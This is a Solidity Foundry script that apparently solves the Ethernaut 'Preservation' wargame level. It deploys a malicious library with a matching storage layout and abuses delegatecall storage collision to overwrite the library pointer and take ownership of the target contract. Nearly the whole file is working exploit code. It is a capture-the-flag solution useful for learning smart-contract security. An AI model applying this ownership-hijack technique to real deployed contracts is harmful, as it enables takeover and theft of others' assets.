// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Preservation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract MaliciousLibrary {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    address public exploitOwner;

    constructor(address _exploitOwner) {
        exploitOwner = _exploitOwner;
    }

    function setTime(uint _time) public {
        owner = exploitOwner;
    }
}

contract PreservationSolution is Script {
    Preservation constant preservationInstance =
        Preservation(0xFD906b947282B9a0ec579bF53Cb4720b4620EEf4);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        MaliciousLibrary maliciousLibrary = new MaliciousLibrary(
            vm.envAddress("MY_ADDRESS")
        );
        preservationInstance.setFirstTime(uint160(address(maliciousLibrary)));
        preservationInstance.setFirstTime(
            0 // Doesn't matter what we pass here
        );
        require(preservationInstance.owner() == vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}
